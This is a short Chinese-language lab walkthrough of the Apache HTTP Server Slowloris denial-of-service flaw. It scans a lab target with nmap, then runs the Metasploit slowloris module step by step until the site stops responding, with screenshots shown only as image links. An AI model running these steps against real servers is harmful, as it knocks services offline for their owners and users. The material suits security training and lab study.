一、漏洞简介

Apache HTTP服务器1.x和2.x允许远程攻击者通过部分HTTP请求导致拒绝服务(守护进程中断)，这与2.2.15之前版本中缺少mod\_ReqTimeout模块有关。

二、漏洞利用

1、访问我们的靶机：192.168.1.131，正常访问

![](../Images/1d20b2d77d2890a51ff79ba49ce6f255.png)

2、启动msf，通过nmap扫描该服务器，判断该漏洞是否存在，nmap -sS -Pn -A 192.168.1.131

![](../Images/0e2e678275484d3c4d36a5e49e103595.png)

  

3、搜索可利用模块，并选择

search slowloris

![](../Images/52843d0a9cba1de24ef801860b0fa7bd.png)

  

4、查看需要配置的参数，只需配置目标ip即可show options 

![](../Images/3474c30f7ec693e71ac0dcd265c4b12e.png)

  

 5、设置目标ip set 192.168.1.131

![](../Images/2a6e871a1600beb1790f2fc5419217e6.png)

  

6、运行，run 

![](../Images/a7acc720656571cd96674eac1557cb68.png)

  

 7、再次访问靶机192.168.1.131，已无法访问

![](../Images/a1efdc91474ecb61389dcd58386ee373.png)

  

8、ctrl+c结束攻击，网页瞬间就又可以访问了

![](../Images/4798ee08c2c451ff5ec9fa7e54c5fe8d.png)
